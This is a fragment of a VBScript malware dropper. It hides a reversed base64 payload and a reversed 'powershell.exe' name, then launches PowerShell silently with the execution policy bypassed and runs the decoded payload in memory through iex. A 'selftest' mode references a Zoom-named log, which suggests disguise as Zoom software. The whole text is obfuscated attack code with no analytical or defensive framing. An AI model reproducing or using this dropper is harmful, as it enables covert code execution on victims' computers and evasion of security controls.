    "slmRu8USbBCIgACIgACIK0wegknc0BCIgAiCNsHIoNGdhNGI", _
    "NVEV6YnblRCIoRXYQ1ibp9mSogCd4VGVsxWQlRXaydlO60VZ", _
    "ulmc0N1bU5yXkACLpcyZvxmLsxWZoNncld3bw1Sbv9menACU", _
    "=0nCNEDI0lGelBCIgAiCN03egg2Y0F2Yg0HIgACIK0QKpgyZ" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
